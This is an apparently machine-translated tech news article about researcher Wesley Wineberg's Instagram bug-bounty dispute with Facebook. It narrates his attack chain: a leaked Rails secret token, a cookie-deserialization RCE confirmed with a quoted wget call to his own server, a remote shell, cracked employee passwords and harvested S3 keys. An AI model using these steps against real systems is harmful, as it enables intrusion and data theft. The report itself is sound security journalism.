<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Facebook threatens security specialist hacking Instagram</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Independent security specialist Wesley Wineberg has come under serious pressure from Facebook. She did not pay for the found vulnerabilities on the In...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Facebook threatens security specialist hacking Instagram</h1><div class="post__text post__text-html js-mediator-article"> Independent security specialist Wesley Wineberg has come under serious pressure from Facebook.  She did not pay for the found vulnerabilities on the Instagram server, and even threatened with a lawsuit. <br><br>  Wesley <a href="http://www.exfiltrated.com/research-Instagram-RCE.php">discovered a vulnerability</a> in the Instagram infrastructure, with which he found (and, perhaps, downloaded) almost everything valuable on Instagram servers: the latest version source code, SSL certificates and private keys for Instagram.com, keys for signing authentication cookies, credentials from the mail server and keys for some other products, including the signature of mobile applications for iOS and Android. <br><br><img src="https://habrastorage.org/files/b3a/835/298/b3a8352981c44c6d944c2614d7547bea.png"><br><a name="habracut"></a><br>  Weinberg also got access to employee accounts and their password hashes, some of which the hacker hacked, and gained access to several Amazon S3 repositories (bakery) with user photos and other private data that are suspected of violating Facebook user privacy. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      The whole of this epic began in October with the fact that a colleague of Weinberg told him about the open web server <code><a href="https://sensu.instagram.com/"></a> sensu.instagram.com</code>  <code><a href="https://sensu.instagram.com/"></a> sensu.instagram.com</code> , which runs on the Amazon EC2 instance and runs the Sensu monitoring framework.  A bug with an open server admin in Facebook has already been reported, but a colleague hinted that he noticed a bug with a remote password reset in the Ruby on Rails application ( <a href="https://cve.mitre.org/cgi-bin/cvename.cgi%3Fname%3DCVE-2013-3221">CVE-2013-3221</a> ), for more details, see the article on <a href="http://www.phrack.org/papers/attacking_ruby_on_rails.html">how to attack Ruby on Rails</a> . <br><br>  The hacker suggested that the same vulnerability can be found in another Instagram code.  He studied their repository on Github, but found nothing like that.  But I found something better.  In secret_token.rb, a secret Rails token was flashed on the githaba.  The article at the link above describes in detail how using such a token not only to fabricate session cookies, but also to initiate deserialization of session cookies in Rails in order to directly start remote code execution. <br><br>  Wesley configured a local Rails instance and used an exploit that rests on a githaba: <a href="">rails-3.2.10-remote-code-execution.md</a> to generate an object that will hide in a cookie. <br><br>  He signed the received object with the secret key from Sensu-Admin - and received cookies from Sensu-Admin.  To the delight of the researcher, the server accepted the cookies, launched deserialization, confirmed the signature, and launched for execution the object hidden inside. <br><br>  It was a team <code><a href="http://exfiltrated.com/test-instagram"></a> wget exfiltrated.com/test-instagram</code>  <code><a href="http://exfiltrated.com/test-instagram"></a> wget exfiltrated.com/test-instagram</code> - and sensu.instagram.com server dutifully turned to the hacker server, which clearly indicated that the exploit was working. <br><br>  Having a working RCE in his hands, the hacker launched a remote shell. <br><br><img src="https://habrastorage.org/files/8c1/6d3/310/8c16d33109b14914ad9c6f92540ea716.png"><br><br>  Having received a complete confirmation of the bug, on October 21, 2015, Weinberg reported two vulnerabilities to Facebook, counting on rewards.  In his blog, he recalls a 2012 <a href="http://www.bloomberg.com/news/articles/2012-07-26/facebook-widens-bug-bounty-program-to-combat-internal-breaches">article</a> in Bloomberg, where Facebook‚Äôs chief security officer talks about his rewards program for vulnerabilities and says, "If they find a million dollar bug, we will pay it." <br><br>  To prove the seriousness of the bug, the researcher continued to examine the contents of the Instagram server, including downloading a local Postgres database with account information of 60 employees and passwords, hashed by bcrypt.  Such hashes are very difficult to choose: the hacker on the computer brute force went at a speed of only 250 attempts per second.  Surprisingly, some passwords were so easy that a dictionary attack had an effect after a few minutes. <br><br><ul><li>  Six passwords "changeme" </li><li>  Three passwords match username </li><li>  Two password "password" </li><li>  One password "instagram" </li></ul><br>  Moving away from the shock, the hacker chose one of the passwords and logged into the web interface. <br><br><img src="https://habrastorage.org/files/81d/989/109/81d9891093f3417689bf4f7756b9c7fe.png"><br><br>  After that, he sent to Facebook information about weak user accounts (October 22). <br><br>  Expecting a reward from Facebook, the specialist examined the contents of the configuration file <code>/etc/sensu/config.json</code> , there were key pairs from 82 containers of Amazon S3.  Access was closed to all but one.  But in this single container, he found another key pair that gave access to all 82nd other containers. <br><br>  Facebook responded quickly, hid the Sensu server for the firewall and on November 16 paid a reward of $ 2500 for the first of three bugs.  At the same time, on October 28, Weinberg received a letter, where he was denied remuneration for the second and third bugs, because the vulnerability with weak user accounts "goes beyond the scope of the reward program for vulnerabilities." <br><br>  Of course, the specialist was a little offended.  Getting just $ 2500 for a remote code execution vulnerability is almost insultingly small.  He published in his blog a description of hacking and several emails from correspondence with the Facebook security department. <br><br>  After that, the situation began to heat up.  Facebook Security Director Alex Stamos called the director of Synack, with which Weinberg works under a contract.  He said that there was an unauthorized access to the database of Instagram employees and confidential user information.  This information should be immediately removed.  Stamos said he did not want to inform lawyers about the incident, but if necessary, the process against Weinberg will be launched. <br><br>  In response to a message on the blog of security specialist, Alex Stamos also <a href="https://www.facebook.com/notes/alex-stamos/bug-bounty-ethics/10153799951452929">published a statement in</a> which he called the hacker's actions "unauthorized and unethical."  He also suggested that Weinberg was dissatisfied with the low remuneration - this explains his behavior. <br><br>  At the same time, the specialist confirmed that he deleted all the data received from the S3 server and did not show it to anyone.  He added that other unclosed vulnerabilities could be left on Instagram hosting.  But it seems that a million dollars will not be paid to him. </div><p>Source: <a href="https://habr.com/ru/post/273491/">https://habr.com/ru/post/273491/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../273481/index.html">Full URL in the address bar, tabs on the right and other improvements in the assembly Vivaldi 1.0.352.3</a></li>
<li><a href="../273483/index.html">Requirements for game functionality</a></li>
<li><a href="../273485/index.html">PHP application for apps.com - features and rakes</a></li>
<li><a href="../273487/index.html">Objective-C questions for middle / senior level</a></li>
<li><a href="../273489/index.html">Juniper Firewall Backdoors</a></li>
<li><a href="../273493/index.html">Preparing ASP.NET 5, issue number 7: more about working with Gulp</a></li>
<li><a href="../273497/index.html">Taming UEFI SecureBoot</a></li>
<li><a href="../273505/index.html">Open lecture: the problem of the feasibility of Boolean formulas</a></li>
<li><a href="../273509/index.html">Immersion in ASP.NET 5 Runtime</a></li>
<li><a href="../273511/index.html">Paul Graham: The Word "Hacker"</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>